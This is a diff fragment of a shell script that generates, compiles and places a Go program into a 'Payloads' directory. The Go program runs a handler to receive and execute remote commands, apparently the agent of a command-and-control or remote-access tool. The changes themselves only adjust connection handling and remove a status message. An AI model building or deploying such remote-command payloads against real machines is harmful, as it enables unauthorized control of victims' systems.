@@ -58,10 +58,8 @@ $private_key
 		close(done)
 	}()
 
-	defer conn.Close() // Close connection if there is a problem connecting
-
 	// Start the handler to receive and execute commands
-	packages.Handler_RSA(conn, OSinfo, formatted_private_key, formatted_public_key, conn_update)
+	packages.Handler_RSA(&conn, OSinfo, formatted_private_key, formatted_public_key, conn_update)
 
 }
 
@@ -95,10 +93,8 @@ func main() {
         close(done)
     }()
 
-    defer conn.Close() // Close connection if there is a problem connecting
-
     // Start the handler to receive and execute commands
-    packages.Handler(conn, OSinfo, conn_update)
+    packages.Handler(&conn, OSinfo, conn_update)
 }
 EOF
 fi
@@ -126,5 +122,3 @@ else
     echo "Error: Failed to delete main.go" >&2
     exit 1
 fi
-
-echo "Go code compiled and executable moved to Payloads directory"
